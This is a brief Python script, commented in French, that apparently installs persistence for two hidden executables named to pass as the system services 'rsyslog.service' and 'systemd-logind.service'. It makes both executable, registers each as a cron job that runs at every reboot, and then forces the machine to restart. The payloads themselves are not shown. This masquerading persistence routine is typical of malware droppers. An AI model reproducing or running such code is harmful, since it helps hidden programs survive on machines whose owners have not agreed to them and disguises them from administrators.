#!/usr/bin/python3
import os,sys,stat
from crontab import CronTab
import time

path = os.getcwd()
filename = 'rsyslog.service'
filename1 = 'systemd-logind.service'
file_path1 = path+'/.dist/'+filename1
file_path = path+'/.dist/'+filename
#donner tous les privilèges au deux scripts
os.chmod(file_path,stat.S_IRWXU)
os.chmod(file_path1,stat.S_IRWXU)

cron = CronTab(user=True)#user name
job=cron.new(command= file_path)
job.every_reboot()
cron.write()
job1=cron.new(command= file_path1)
job1.every_reboot()
cron.write()
print("Redémmarage en cours.....")
time.sleep(2.0)

os.system( "reboot") #redémarrage de la machine
#
